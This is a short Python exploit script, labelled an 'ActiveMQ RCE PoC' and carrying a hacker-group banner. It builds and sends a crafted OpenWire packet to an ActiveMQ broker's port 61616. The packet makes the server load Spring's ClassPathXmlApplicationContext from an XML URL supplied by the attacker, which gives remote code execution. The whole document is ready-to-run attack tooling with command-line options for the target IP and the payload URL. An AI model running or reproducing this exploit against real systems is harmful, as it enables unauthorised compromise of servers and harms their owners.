import socket
import binascii
import argparse


def banner():
    print("""
                     _
         _   _ _ __ | | ___ __   _____      ___ __        ___  ___  ___
        | | | | '_ \| |/ / '_ \ / _ \ \ /\ / / '_ \ _____/ __|/ _ \/ __|
        | |_| | | | |   <| | | | (_) \ V  V /| | | |_____\__ \  __/ (__
         \__,_|_| |_|_|\_\_| |_|\___/ \_/\_/ |_| |_|     |___/\___|\___|

    """)


def string2hex(s):
    return binascii.hexlify(s.encode()).decode()


def int2hex(i, n):
    if n == 4:
        return f"{i:04x}"
    elif n == 8:
        return f"{i:08x}"
    else:
        raise ValueError("n must be 4 or 8")


def main(ip, port, xml):
    banner()
    class_name = "org.springframework.context.support.ClassPathXmlApplicationContext"
    message = xml

    header = "1f00000000000000000001"
    body = f"{header}01{int2hex(len(class_name), 4)}{string2hex(class_name)}01{int2hex(len(message), 4)}{string2hex(message)}"
    payload = int2hex(len(body) // 2, 8) + body
    data = binascii.unhexlify(payload)

    print(f"[+] Target: {ip}:{port}")
    print(f"[+] Poc XML: {xml}\n")
    print(f"[+] Sending packet: {payload}")

    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect((ip, int(port)))
    conn.sendall(data)
    conn.close()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ActiveMQ RCE PoC")
    parser.add_argument("-i", "--ip", required=True, help="ActiveMQ Server IP or Host")
    parser.add_argument("-p", "--port", default="61616", help="ActiveMQ Server Port")
    parser.add_argument("--xml", required=True, help="rce xml url")
    args = parser.parse_args()
    main(args.ip, args.port, args.xml)
